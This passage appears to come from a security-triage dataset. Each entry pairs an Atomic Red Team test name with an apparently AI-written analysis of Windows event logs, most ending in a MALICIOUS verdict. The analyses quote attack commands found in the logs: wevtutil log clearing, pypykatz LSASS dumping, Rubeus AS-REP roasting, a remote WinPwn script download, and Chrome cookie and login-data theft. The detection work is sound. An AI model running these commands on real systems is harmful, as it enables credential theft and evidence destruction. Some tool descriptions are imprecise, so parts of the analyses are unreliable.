   - The log reflects a clearing of the security event log by a user with the username ""admin_test"". The clearing of logs, especially security-related, is a known tactic used by attackers to cover their tracks after executing malicious actions.

2. **PowerShell Activity**:
   - The PowerShell logs contain suspicious script activity that involves the following:
     - Invocation of a PowerShell command that copies a dynamic link library (DLL) file `NPPSPY.dll` from a temporary directory to `C:\Windows\System32`.
     - Registry modifications to include ""NPPSpy"" in the network provider order, which indicates an attempt to gain unauthorized access or perform man-in-the-middle activities.
     - The script appears to create registry keys and properties to set up the malicious network provider.
     - The PowerShell script also echoes a message that suggests capturing user credentials in a file, `C:\NPPSpy.txt`, upon logging back in. This is a strong indicator of credential harvesting.

3. **Sysmon Logs**:
   - The Sysmon logs corroborate the execution of suspicious processes, as seen with `powershell.exe` executing the script above.
   - Logs show the execution of `wevtutil.exe` to clear event logs, which aligns with the Security log clearing event. This further reinforces the possibility of an attempt to conceal malicious activity.
   - Multiple instances of `conhost.exe` associated with suspicious parent processes show the processes are being run under high integrity, suggesting privilege escalation or misuse.

4. **System Log (Event ID 104)**:
   - Reflects that the system logs for various channels, especially Windows PowerShell, are being cleared. Clearing multiple types of logs (Security, System, and Windows PowerShell) within a short timeframe is unconventional and likely intentional to evade detection.

### Conclusion

The logs contain multiple events indicative of malicious activity:
- The rapid succession of log clearing across security, system, and PowerShell channels.
- A suspicious PowerShell script that modifies system state and hints at credential harvesting.
- Association with tools (`wevtutil.exe`, registry modifications) and methods (log clearing, registry edits for persistence) commonly employed by attackers.

**Resolution: MALICIOUS**

### Recommendation

I recommend the following actions:
- Immediately isolate ""Server002"" for further forensic analysis to prevent further potential breaches or data leakage.
- Conduct a comprehensive review of user account activities, especially ""admin_test"", and consider temporary suspension until further investigation.
- Restore the system from a known good backup prior to 2024-10-20.
- Implement additional logging and monitoring on critical systems to detect further suspicious activities.
- Update security policies to restrict the usage of PowerShell, particularly for non-administrative tasks, and ensure robust access control measures are in place."

LSASS read with pypykatz,"Upon analysis of the provided Windows event logs, several key indicators of anomalous and potentially malicious behavior are observed:

1. **Event Log Clearing:**
   - The logs display multiple instances of event log clearing using `wevtutil.exe`:
     - System log cleared via `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - Security log cleared via `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - Windows PowerShell log cleared via `""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`
   - Log clearing is often an attempt to cover tracks on a compromised system by an attacker.

2. **Suspicious System Process Executions:**
   - The logs show execution of `cmd.exe` with command-line arguments linked to execution of `pypykatz live lsa`, which is indicative of an attempt to dump credentials from LSASS memory. `pypykatz` is known for mimicking `mimikatz` functionality for extracting creds from a live system.
   - The command line used was: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz"" live lsa`.

3. **Credential Access Activity:**
   - The usage of tools similar to Mimikatz (`pypykatz`) suggests malicious intent on credential access and privilege escalation attempts.

4. **Consistency in User Context:**
   - Most actions of concern were executed under the user ""admin_test,"" suggesting potential misuse of this account (or compromise, considering the sequence of activities).

### Assessment and Conclusion:
The collected evidence aligns with typical post-exploitation techniques where an attacker attempts to access credential material and clear logs to avoid detection. The activities observed are not typical of benign administrative tasks that one would expect on a maintained and properly managed system.

Cached Credential Dump via Cmdkey,"Based on the provided Windows event logs, a detailed analysis reveals the following significant activities:

### Suspicious Activities:

1. **Log Clearance Events**: 
   - Several logs (EventID 104 in the System log, EventID 1102 in the Security log) indicate the clearing of event logs by the user ""admin_test"". 
   - The use of `wevtutil.exe` to clear multiple logs, including the System, Security, and Windows PowerShell logs, appears suspicious. This tool is a common utility used for such tasks and can be exploited by malicious actors to hide traces of unauthorized activities.

2. **High-Privilege Logon and Privilege Usage**:
   - User ""admin_test"" is associated with logon events (EventID 4624) using NTLM authentication and assigned high privileges (EventID 4672), such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which can be considered suspicious if not expected for this user.
   
3. **Credential Manager Access**:
   - A command involving `cmdkey.exe /list` was executed, which displays cached user credentials (EventID 17954 and 17956 under Sysmon logs). This behavior could indicate an attempt to gather credentials for further exploitation.

### Non-Suspicious Activities:

- **Windows Defender Updates**:
  - The logs related to updating Windows Defender (EventID 44, 43, 19 in the System and Sysmon logs) are benign and indicate routine update checks and installations.
  
- **System and Security Maintenance**:
  - Numerous events indicate processes associated with Microsoft updates, Edge updates, and other routine system maintenance tasks.
  
### Assessment:

The activity involving the clearing of event logs in conjunction with high-privilege access and attempts to list cached credentials suggests potentially malicious behavior. Such actions are commonly associated with attempts by a malicious actor to cover their tracks and prepare the ground for further exploitation.

### Recommendation:

Given the findings, it would be prudent to consider the activity **SUSPICIOUS** for the following reasons:

- The log-clearing activity by ""admin_test"" warrants further investigation to determine if it was part of a legitimate maintenance task or if ""admin_test"" credentials were compromised.
- Investigate any anomalies with the account ""admin_test"" and verify the legitimacy of associated high-privilege logons.
- Conduct a thorough forensic investigation on the host to ensure no further breaches or malicious activities are occurring.

Further investigation is required to rule out compromise and ensure the security of the system and network."
WinPwn - SessionGopher,"Upon analyzing the provided logs, several key indicators suggest malicious activity on the system:

1. **Log Clearing Activity**: 
   - Several logs show that event logs for different channels (System, PowerShell, etc.) are being cleared using `wevtutil.exe`. The clearing of security and other logs without an apparent legitimate reason is often an attempt to cover tracks and indicates potential malicious activity.
   - For example, entries like these highlight the use of `wevtutil.exe` to clear logs:
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`
   - Additionally, Security Event ID `1102` indicates that the security log was cleared, which is typically an uncommon and suspicious event.

2. **Suspicious PowerShell Activity**:
   - There are logs detailing suspicious PowerShell activity where an external script is being downloaded and executed: 
     - The command involves using PowerShell to download and execute a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1`. Downloading and executing scripts from external or untrusted sources is considered high risk.
     - This kind of behavior is a common technique used for the execution of malicious scripts and the potential loading of malware.

3. **High Integrity Level Process Execution**:
   - The logs show execution of processes with high integrity levels. For example, the `wevtutil.exe` and `powershell.exe` are executed with high integrity, suggesting they were running with elevated (administrator) privileges, which is common in privilege escalation and other malicious activities.

4. **Use of Built-in Windows Utilities**:
   - Utilities like `whoami.exe`, `wevtutil.exe`, and `svchost.exe` in the logs are used in a manner consistent with attempts to gain system information and manipulate system logs, which can be behavior exhibited by advanced persistent threat (APT) actors or malware.

5. **Script Content**:
   - The PowerShell script WinPwn.ps1 is known as a penetration testing tool used to identify vulnerabilities and escalate privileges. Its usage outside of a security assessment context is potentially malicious.

Given the evidence:

- The clearing of multiple event logs, the launching and usage of suspicious scripts via PowerShell, combined with the systemic pattern of these actions, strongly suggest a compromise or unauthorized activity.

**Assessment and Resolution:**

- **Resolution**: MALICIOUS
- **Threat/Risk**: Evidence points to unauthorized access and potential malicious actions on the system. There is a likely security breach resulting in unauthorized log clearance and execution of potentially harmful scripts.
- **Guidance**:
  - Initiate an incident response protocol immediately.
  - Conduct a thorough investigation to identify any compromised files, persistence mechanisms, and potential data exfiltration.
  - Consider isolating the affected system to prevent further compromise or spread.
  - Review and possibly revoke any suspicious or compromised credentials.
  - Implement additional monitoring and logging measures to capture any subsequent malicious actions or attempts."
Enumeration for PuTTY Credentials in Registry,"After analyzing the provided Windows event logs, here are the key observations:

### Security Log Analysis:
1. **Event ID 1102 (LogFileCleared):** The security log was cleared by a user named `admin_test`. Clearing event logs is typically a suspicious activity as it can be an attempt to cover up malicious actions.
2. **Event ID 4672 (Special Privileges Assigned):** The user `admin_test` was assigned several high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This could suggest privilege escalation.
3. **Event ID 4624 (Logon):** There's a successful logon involving `admin_test` using NTLM authentication from a workstation named `DESKTOP-3HL5B2P`.

### System Log Analysis:
- **Event Log Clearing:** The system and Windows PowerShell logs were also cleared around the same time by `admin_test`, further pointing to an attempt to hide evidence of inappropriate activities.

### Sysmon Log Analysis:
1. **Process Execution:** There are several instances of `wevtutil.exe` processes with command-line arguments indicating log clearance (`wevtutil.exe cl Security`, `cl System`, etc.).
2. **Registry Query:** There is a command execution via `cmd.exe` that involves querying the registry for PuTTY session configurations. This could suggest reconnaissance or preparation for further actions.
3. **General Usage of Built-in Tools:** The frequent usage of in-built Windows utilities such as `whoami.exe`, `hostname.exe`, and `cmd.exe` in a short period is typically associated with lateral movement or privilege escalation activities.

### Application Log Analysis:
- No direct indications of malicious activity beyond general log clearances and service activities.

### Conclusion and Guidance:
- **Resolution: MALICIOUS**: The combination of clearing logs, privilege escalation, suspicious process executions, and registry queries strongly indicate malicious activity. The user `admin_test` appears to have conducted these actions, possibly indicative of insider threats or compromised credentials.

### Recommendations:
1. **Immediate Action:** Revoke or closely monitor `admin_test` account activities and consider isolating the affected system.
2. **Further Investigation:** Conduct a broader forensic investigation to determine the full scope and intent of the activities.
3. **Implement Monitoring:** Increase monitoring on key accounts and regularly check for high-privileged operations.
4. **Review Access Controls:** Ensure that sensitive operations such as log clearing are restricted to designated administration personnel and are fully logged and monitored."
Create Volume Shadow Copy with Powershell,"In analyzing the provided logs from a Windows host, several suspicious activities centered around PowerShell and the manipulation of event logs are observed. Here is a detailed breakdown of the findings:

1. **PowerShell Activity**:
   - The Windows PowerShell logs show that PowerShell was executed with the command: `(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')`. The use of `gwmi` (Get-WMIObject) to create a shadow copy is often seen in post-exploitation activities to create backups of data for exfiltration or to bypass security controls.
   
2. **Sysmon Logs**:
   - The Sysmon logs indicate that multiple instances of `wevtutil.exe` (the Windows Event Logging Command Line Utility) were executed. The command used is: `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, along with clearing the Application, System, and Security logs. This command is used to clear the event logs, which is a known tactic used by attackers to cover their tracks and eliminate evidence of their activities.
   - The fact that these commands were initiated under the user ""admin_test"" with a high integrity level indicates potential privilege misuse.

3. **Security Event Logs**:
   - There is a security event (Event ID 1102) showing that the Security log was cleared by the user ""admin_test"". This aligns with the actions observed in the Sysmon logs, pointing towards malicious intent to hide activities.

4. **System Event Logs**:
   - Similarly, there are clearances recorded in the System logs (Event ID 104), which further corroborates with the observed Sysmon behavior of clearing event logs.

5. **Time Manipulation**:
   - There are indications of time manipulation with the Kernel-General event logs showing time changes. This activity is another common tactic used by attackers to manipulate timestamps on logs or other files as part of obfuscating actions taken on a system.

**Assessment**:
The combination of PowerShell activity related to shadow copy creation, aggressive clearance of event logs, and the manipulation of system time strongly indicates malicious behavior. The actions taken align well with common tactics used in advanced persistent threats or other sophisticated attacks that aim to maintain persistence and obfuscate trails.

**Resolution: MALICIOUS**
- The logs contain activities that are definitively indicative of malicious actions.
  
**Guidance on how to proceed**:
- Immediately conduct a full investigation of the host ""Server002"" to identify and neutralize any ongoing threats.
- Isolate the system from the network to prevent further potential exfiltration or lateral movement.
- Consult digital forensics specialists to perform a thorough forensic analysis.
- Review and strengthen logging policies, ensure regular backups of logs, and configure alerts for critical activities such as log clearance and usage of sensitive PowerShell commands."
Steal Chrome Cookies (Windows),"Upon analyzing the provided Windows event logs, several suspicious events have been identified, which warrant further investigation. Here’s the detailed analysis highlighting these activities:

### Analysis:

#### 1. Log Clearing Activities:
- **System Log Entry EventID 104**: The logs indicate that the event logs for System, Windows PowerShell, and other channels were cleared by the user ""admin_test"" at ""2024-10-27 12:38:09"". The clearing of logs can be an attempt by an attacker to hide malicious activities.
- **Security Log Entry EventID 1102**: This event also highlights that security logs were cleared by ""admin_test"". Clearing logs in such a manner is a strong indication of an attempt to cover tracks.

#### 2. Suspicious PowerShell Execution:
- **Sysmon Entry**: A PowerShell command was executed by the user ""admin_test"" with a script attempting to access Chrome cookies database and outputting to a file. This behavior indicates a possible attempt to extract sensitive information such as cookies, which is typical of credential theft or data exfiltration attempts:
  - `select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies]`
- **PowerShell Log**: Reflects the same command being run, corroborating the suspicious use of PowerShell for potentially malicious purposes.

#### 3. Use of Command-Line with External Tools:
- **Sysmon Entries**: Execution of external tool `sqlite3.exe` from a temporary directory associated with ""AtomicRedTeam"". The `sqlite3` tool is used to query the Chrome Cookie database files, raising suspicion about unauthorized access to browser data.

#### 4. Usual Process and Update Behavior:
- **Application Logs**: Entries related to Microsoft Edge Update services being stopped and started. While these could be legitimate activities, they are minor compared to the other suspicious activities identified.

### Overall Assessment:
The combination of log clearing, suspicious PowerShell execution aimed at accessing browser cookies, and the use of unauthorized tools strongly indicate potentially malicious behavior. The activities are indicative of an attempt to hide actions and possibly exfiltrate sensitive browser data, thus representing a significant risk.

### Final Resolution: **MALICIOUS**

### Recommendations:
1. **Immediate Action**: Isolate the affected host from the network to prevent further data exfiltration and spread of potential threats.
2. **Detailed Forensic Analysis**: Investigate the source of the suspicious PowerShell commands and inspect any additional scripts or tools that may have been used.
3. **Review User Activity**: Audit the actions performed by the user ""admin_test"" and verify if the account credentials have been compromised.
4. **Log and Monitor Activities**: Enhance logging and monitoring to ensure early detection of anomalous activities in the future.
5. **Security Awareness Training**: Conduct security awareness training for users to understand the risks of executing suspicious scripts and handling sensitive data.

Given the provided evidence, the events are indicative of a security incident with potentially malicious intent. It is crucial to address the occurrence promptly to mitigate threats and secure the environment."
Create Volume Shadow Copy remotely (WMI) with esentutl,"### Analysis of the Provided Event Logs

#### Application Log
- **VSS Errors (Event ID: 13 and 8193)**: These errors indicate that there were issues with the Volume Shadow Copy Service (VSS). The specific error `CoInitialize has not been called` is often related to system or software-level problems rather than an indication of malicious activity. It is common and usually benign, often occurring during regular backup processes or other VSS-dependent operations.
- **Software Protection Platform Event (Event ID: 16384)**: This event likely indicates normal license management activity related to Windows activation and does not suggest any malicious behavior.

#### Security Log
- **Event ID 1102 (Event Logs Cleared)**: The security log shows that logs were cleared by the user `admin_test`. Clearing event logs is a common tactic used by adversaries to cover tracks and can be a strong indicator of malicious activity. 
- **Event ID 4799 (Group Membership Enumeration)**: This event shows the user `admin_test` interacting with the built-in Administrators group. Although this may be part of routine administrative actions, it should be correlated with other suspicious activities for further context.

#### Sysmon Log
- **Execution of `wevtutil.exe`**: The `wevtutil.exe` command is being used to clear specific logs (Sysmon, Application, Security, and PowerShell). This action taken by `admin_test` coincides with the clearing of logs as seen in the security events. This is suspicious as it indicates an attempt to erase activity on the system.
- **Execution of `esentutl.exe` via Command Line**: Multiple instances of command execution were observed where `esentutl.exe` was run through command line with options that indicate VSS (Volume Shadow Copy Service) manipulation. The use of `esentutl.exe` in such a manner is consistent with attempts to extract data from the NTDS (Active Directory) database or potentially other sensitive operations.
- **WMIC Execution**: The execution of `wmic.exe` to create another process is also noted. While WMIC can be used legitimately by administrators, in the context of the above actions, it could further suggest suspicious activity, particularly around the execution of critical system command-line operations without direct user command.
- **Other Legitimate Updates**: Microsoft Edge updates appear legitimate and consistent with normal software updating behavior.

#### System Log
- **Clearing of System and PowerShell Logs (Event ID: 104)**: Repetitions of clearing logs on various channels could indicate malicious intent especially when executed by a non-routine admin action being logged by `admin_test`.

### Assessment

The combination of the log clearing activities, suspicious command executions (such as `esentutl.exe` and `wevtutil.exe`), and triggering other processes with elevated privileges font the following hypothesis:

- **Potential Threats Identified**: The logs exhibit behavior consistent with attempts to erase forensic traces (via log clearing) and potentially accessing or manipulating sensitive data (via `esentutl.exe` and `wmic.exe`). 

### Resolution: MALICIOUS

Based on this analysis, the indicators strongly suggest malicious activity. It is likely an insider threat or compromised account used to conduct unauthorized activities on the system. The events show a conscious attempt to cover tracks, which is a hallmark of an advanced persistent threat or insider attack.

### Guidance
- **Immediate Actions**: Conduct a full forensic investigation on the host to identify the source of the breach and any data exfiltration or damage.
- **Account Review**: Investigate the `admin_test` account usage and audit its activity logs across other systems.
- **Enhance Monitoring**: Deploy more comprehensive monitoring and alerts for log clearance events and privilege use, particularly for users with high-level access.
- **Review Access Controls**: Evaluate and tighten access controls and review user access privileges, particularly for sensitive tools and data such as Active Directory databases."
Password Spray using Kerbrute Tool,"After thoroughly analyzing the provided log entries, several points of concern indicate potentially malicious activity:

1. **Use of PowerShell with Kerbrute and Password Spraying**:
   - Multiple logs indicate the use of `powershell.exe` to launch `kerbrute.exe` with the intent of password spraying via command line: `& {cd \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\\""\"", .\\kerbrute.exe passwordspray...}`. This behavior is notably suspicious as Kerbrute is a known tool for brute-forcing service principal names in Active Directory environments.

2. **Event Log Clearing**:
   - The security log shows Event ID 1102, which indicates administrative user `admin_test` cleared event logs. This act is often associated with attempts to cover tracks after unauthorized or malicious activity.

3. **Unexpected Logon and Privilege Events**:
   - Multiple 4624 (Successful Logon) and 4672 (Special Privilege Assigned to New Logon) events were observed for the SYSTEM user context, suggesting potential exploitation of system processes, although this is somewhat expected for SYSTEM level operations, the timing alongside other suspicious activities is concerning.
   
4. **Log Evidence of Potentially Enumerative Actions**:
   - Commands involving `whoami.exe` and HOSTNAME.EXE indicate potential reconnaissance activities to gather information about the system environment and logged-in users.
   
5. **Clearing of Windows PowerShell Logs**:
   - Logs indicate PowerShell logs were cleared, which further supports the idea of malicious intent, likely to erase evidence of the nefarious commands executed.

Given these observations, the following resolution is determined:

**Resolution: MALICIOUS**

The logs exhibit clear indicators of compromise, particularly with evidence of reconnaissance, password spraying attempts using PowerShell and Kerbrute, and event log tampering to obscure activities. Immediate action should be taken to quarantine the affected system, conduct a full investigation into potential data breaches or unauthorized access, and review security policies to prevent further exploitation. It is critical to deploy additional monitoring to detect and respond to suspicious activities promptly."
Dump Chrome Login Data with esentutl,"The Windows event logs provided contain several indicators of potentially suspicious or malicious activity. Below is a detailed analysis of the logs:

1. **Execution of Critical Command Line Tools:**
   - Multiple executions of `wevtutil.exe` are noticeable. This tool is known for managing event logs, and here it is invoked with the command line to clear event logs (e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). This act of clearing logs can be indicative of an attempt to cover tracks post-malicious activity.
   
2. **Other Suspicious Executions:**
   - Execution of `esentutl.exe` with the flags to copy Google Chrome's login data file to a temporary directory (`""%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Default\\Login Data""`). This behavior aligns with a known tactic of exfiltrating sensitive browser data.
   - The presence of `cmd.exe` invoking `esentutl.exe` further supports the likelihood of scripted or unauthorized automation to extract data from the system.
   
3. **Clearing Security Logs:**
   - Security logs (EventID 1102) and System logs (EventID 104) show clearings by the user ""admin_test"" around the same time suspected data exfiltration was attempted. Clearing event logs is a common technique employed by attackers to erase evidence of their presence and actions.

4. **Process Execution Context:**
   - All processes that executed suspicious commands were running under the same user context, ""SERVER002\\admin_test,"" with a high integrity level, which suggests the processes had administrative privileges. This context, combined with the activities, strengthens the case for potential misuse by an insider or an externally compromised account.

5. **Inconsistent Use of Tools:**
   - Usage of `hostname.exe` and `whoami.exe`, while not inherently malicious, can be part of a broader script for recon activities, especially when found in proximity to other suspicious activities such as log clearing.

### Assessment:

Based on the analyzed logs, there's clear evidence of activity that is consistent with malicious intent. The behavior includes an attempt to extract sensitive login data from a browser and clearing logs to obfuscate these actions from detection—classic indicators of system compromise.

### Resolution:

- **MALICIOUS**: The logs exhibit activity strongly indicative of malicious intent, particularly due to the sequence of events related to credential data extraction and subsequent clearing of logs to avoid detection.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected host from the network to prevent potential lateral movement or further exfiltration of sensitive data.
   - Reset credentials for the user ""admin_test"" and evaluate this account for unauthorized access patterns or changes that could indicate compromise.
   
2. **Forensic Investigation:**
   - Conduct a thorough review of any infective payloads possibly introduced in the system using forensic tools.
   - Examine any other connected systems for similar indicators of compromise.

3. **Long-term Recommendations:**
   - Enhance monitoring for similar activities across all endpoints.
   - Consider implementing controls such as multi-factor authentication, especially for administrative accounts, to mitigate unauthorized access.
   - Reinforce logging mechanisms and restrict access to log management utilities like `wevtutil.exe`."
Create Symlink to Volume Shadow Copy,"### Analysis of the Logs

Upon reviewing the provided Windows event logs, multiple events suggest potential suspicious activity that warrants further investigation:

#### Findings:

1. **Log Clearing Activities (Event ID 104, 1102)**:
   - There are multiple instances where the event logs are cleared by the user `admin_test` on the machine `Server002`. Specifically, entries show clearing of the System, Windows PowerShell, and Security logs (`Event ID 104` in the System logs, `Event ID 1102` in the Security logs). This is a significant red flag as attackers often clear logs to cover their tracks post-compromise.
   
2. **Unusual Command-Line Activity (Event ID 1 in Sysmon logs)**:
   - We observe the execution of the `wevtutil.exe` (Eventing Command Line Utility) to clear logs for System, Application, and Security channels, along with using `vssadmin.exe create shadow` command. This command is typically utilized to create shadow copies of volumes, possibly for data exfiltration purposes.
   - The creation of a symbolic link to a shadow copy directory using `cmd.exe` is also noted, which can indicate malicious intentions like bypassing permissions to access files.
   
3. **Elevated Privileges (Event ID 4672)**:
   - The account `admin_test` is seen acquiring several high-level privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.`). Elevated privileges are often a precursor for various malicious activities, including data exfiltration or lateral movement.
   
4. **Network Based Logon Sessions (Event ID 4624)**:
   - There are logon events showing network logins (Logon Type 3) via NTLM authentication from different IP addresses, which might be indicative of remote connections to the machine.

5. **Credential Access Events (Event ID 5379)**:
   - Repeated failed credential access attempts to Microsoft and Windows Live accounts are noted. While the return code indicates failure, frequent authentication attempts are suspicious and might suggest credential stuffing or brute force attacks.

#### Assessment:

Given the actions of log clearing, suspicious command execution especially with high privileges, and unusual network logons, these logs reveal signs of potentially **MALICIOUS** activity.

### Recommendation:

1. **Immediate Isolation**: Disconnect the affected host `Server002` from the network to prevent any potential lateral movement by an attacker.
2. **Forensic Analysis**: Conduct a full forensic investigation on `Server002` to identify any modifications, persistence mechanisms, or additional malicious activities.
3. **Review User Access**: Investigate the activities of `admin_test`, check the validity and security of this account, and consider a password reset or disabling the account temporarily.
4. **Increase Monitoring**: Enhance monitoring on other systems in the network to detect similar activities or indicators of compromise.
5. **Patch and Update**: Ensure all systems are updated to the latest security patches to mitigate any exploited vulnerabilities.

By following these steps, you can contain and mitigate the potential threat while gathering more information for a comprehensive understanding of the attack path and goals."
Rubeus asreproast,"### Detailed Analysis:

1. **Process Execution & Tools:**
   - **Powershell.exe Execution:**
     - Several `powershell.exe` events (Event ID: 1) were observed. One of the command lines executed was: 
       ```
       powershell.exe & {cmd.exe /c ""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\rubeus.exe\"""" asreproast /outfile:""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\rubeus_output.txt""}
       ```
     - **Analysis:** This indicates the usage of `rubeus.exe`, a well-known tool used for Kerberos-related attacks such as AS-REP Roasting. This aligns with potentially malicious activity within the network environment, specifically targeting Active Directory components.

2. **Log Clearing:**
   - Multiple `wevtutil.exe cl <Channel>` events (Sysmon Event ID: 1) were logged. This signifies the clearing of several event logs (`System`, `Application`, `Security`, `Windows PowerShell`). 
   - **Security Event ID 1102** shows logs were cleared by user `admin_test`, a highly concerning behavior especially from an account with administrative privileges.
   - **Analysis:** Clearing of logs is often associated with attacker efforts to remove traces and cover up their actions, supporting a malicious intent.

3. **User Account and Privileges:**
   - The actions recorded in the logs are attributed to the user `SERVER002\\admin_test`, who has been executing commands and clearing logs.
   - The integrity level associated with these operations was `High`, implying usage of administrative accounts or privilege escalation before executing these commands.

4. **Microsoft Edge Update Entries:**
   - Various entries related to Microsoft Edge Update processes were observed. These generally appear benign unless coupled with external indications of tampering or when serving as a guise for other operations.
   
5. **Windows Defender Status:**
   - Windows Defender appears to be in an active state during the observed period as repeatedly indicated with ""SECURITY_PRODUCT_STATE_ON"". However, presence of `rubeus.exe` could imply a gap in threat detection or evasion tactics in play.

### Assessment of the Situation:

The logs present clear indicators of potentially malicious activities:
- The execution of a known attack tool (`rubeus.exe`) for credential dumping.
- Log clearing actions performed multiple times by an administrative user, obviously to erase activity trails.
- Host applications and processes were launched with high integrity levels, indicating administrative access.
  
### Resolution: MALICIOUS

Given the above signs, the nature of the executed commands, and actions taken such as clearing security and system logs, it points towards unintended or malicious usage. This analysis concludes that the activities captured in these logs are **malicious**.

1. **Isolate the Host:**
   - Immediately isolate the affected host (Server002) from the network to prevent further exploitation and lateral movement within the network.

2. **Incident Response:**
   - Engage the Incident Response team to perform a comprehensive investigation to understand the extent of compromise and identify potential indicators of compromise (IOCs) across the network.

3. **Review Administrative Accounts:**
   - Review and limit the number of accounts with administrative privileges. Change credentials and enhance monitoring on these accounts.

4. **Log Analysis and Monitoring:**
   - Increase monitoring of event logs and implement real-time alerting for suspicious activities such as log clearing, unusual use of tools like `powershell.exe`, and unauthorized software tool execution.

5. **Threat Intelligence and Partnerships:**
   - Consult Threat Intelligence sources to understand similar recent threats and potential tactics, techniques, and procedures (TTPs) in use to inform defensive measures.
   
6. **Root Cause Analysis:**
   - Perform a complete system and network forensic analysis to determine the root cause of the compromise and establish improved defenses to mitigate future risks."
Crafting Active Directory golden tickets with Rubeus,"Upon reviewing the provided event logs from the Windows host ""Server002"", several findings indicate potentially malicious activity, particularly focused around the execution of a ""Golden Ticket"" attack using PowerShell and the ""Rubeus.exe"" tool. Below is a detailed analysis:

### Key Indicators of Malicious Activity:

1. **PowerShell Execution**:
   - The logs repeatedly show the execution of PowerShell scripts that involve the tool ""rubeus.exe"". This tool is widely used for performing various Kerberos-related attacks, including extracting Kerberos tickets (""Golden Ticket"" attacks).
   - The scripts are attempting to manipulate Kerberos tickets:
     - Use of Rubeus: `""cmd.exe /c \""$Env:temp\\rubeus.exe\"" golden...""`
     - Commands are processed to purge existing tickets and create new ones, indicative of credential theft attacks.
   - The scripts reference creating a batch file for a ""Golden Ticket attack"", including commands like `klist purge` and fetching the SYSVOL directory, which are typical actions taken during such attacks to impersonate users.

2. **Anomalous Process Activities**:
   - The execution of sensitive administrative utilities such as `klist.exe`, `cmd.exe`, and `runas.exe` in a specific sequence and context (related to Kerberos manipulation).
   - Usage of `runas.exe` with the `/netonly` flag hints at attempts to run processes with impersonated credentials without actually logging in, fitting the profile of lateral movement or persistent access tactics.

3. **Clearance of Event Logs**:
   - Critical security logs (including System and Security logs) are cleared immediately after the suspicious PowerShell activity, which is a known tactic to cover tracks after malicious actions.
   - Sysmon events indicate that `wevtutil.exe` (Windows Event Utility) was used to clear specific event logs, which is often a sign of malicious intent to hide traces of activity.

4. **Unauthorized Privilege Use**:
   - Event IDs like 4672 denote special privileges were assigned to the administrative user ""admin_test"", which aligns with activity to escalate privileges potentially beyond legitimate needs, especially in a compromised session context.

### Assessment:

The logs provide strong evidence of an active and orchestrated attack campaign involving a Golden Ticket attack. The use of known attack tools (Rubeus), targeted use of network and security utilities, and intentional log clearance are significant red flags indicating malicious activity.

### Resolution:
- **MALICIOUS**: The logs contain activities that are conclusively indicative of malicious actions aiming to compromise system security and credentials.

### Recommended Actions:

1. **Immediate Isolation**: Isolate ""Server002"" from the network to prevent further unauthorized access or lateral movement.
2. **Detailed Forensic Analysis**: Conduct a full disk and memory forensic analysis to capture the state of the machine and identify any backdoors or additional compromises.
3. **Incident Response and Mitigation**: Follow operational procedures to contain and remediate the breach, involving resetting passwords, updating security protocols, and patching any vulnerabilities.
4. **Review and Monitor Logs**: Reconfigure logging for better detection and monitor for any anomalous behavior that might appear in other systems.
5. **Security Awareness and Training**: Reinforce security training around identifying phishing tactics, unauthorized software use, and log review practices.

These steps are crucial to ensuring the safety and integrity of the impacted systems and data."
Password Cracking with Hashcat,"Based on the logs provided, there are several indicators of potentially malicious activity. I'll outline these findings with explanations and then conclude with a resolution.

### Key Findings

1. **Event ID 1102 - Security Log Cleared:**
   - **Event ID 1102** in the Security log indicates that the security log was cleared by `admin_test`. Clearing logs can be an attempt to cover up malicious activity by removing records of actions.
   
2. **Use of `hashcat.exe`:**
   - The **Sysmon logs** show a Windows Command Processor (`cmd.exe`) executing with a command line that involves `hashcat.exe`, a known password-cracking tool. The use of `hashcat.exe` indicates a potential brute force or password cracking attempt. The execution and the context (admin user executing from `C:\Users\admin_test\AppData\Local\Temp`) further support the likelihood of unauthorized or malicious attempts at password manipulation or hash processing.
   
3. **Event ID 104 - System and PowerShell Logs Cleared:**
   - **Event ID 104** in the System log suggests that log files related to the System and Windows PowerShell were cleared. This action, performed by the same `admin_test` user shortly after other potentially malicious activities, is usually suspicious and could be evidence of log tampering to hide traces.

4. **Event ID 4624 and 4672 - Privileged Logons:**
   - Multiple instances of **Event ID 4624** (successful logons) and **Event ID 4672** (special privilege assignation) are observed for the `SYSTEM` account. While these can occur during typical system operations, the timing and frequency, in conjunction with other events, suggest possible misuse.

### Assessment and Conclusion

The combination of events, particularly the clearing of logs (Event IDs 1102 and 104), the use of `hashcat.exe`, and privileged log events, suggest attempts to conduct unauthorized activities, possibly followed by actions to hide these attempts. The execution of known security tools like hashcat in a context that is typically associated with temporary and potentially transient operations (i.e., use of `C:\Users\admin_test\AppData\Local\Temp\`) signals a high risk of compromise.

### Resolution

After evaluating the entirety of logs provided, the conclusion is:

- **MALICIOUS** - There is a high degree of certainty that the activities indicated in the logs can be classified as malicious due to the presence of password cracking attempts, log tampering, and suspicious privilege usage patterns.

### Guidance

1. **Immediate Response and Isolation:**
   - Isolate the affected host (Server002) from the network immediately to prevent further unauthorized access and spread.

2. **Digital Forensics and Investigation:**
   - Conduct a thorough forensic analysis to understand the full extent of the compromise and identify other affected systems if any.

3. **Credential Security Review:**
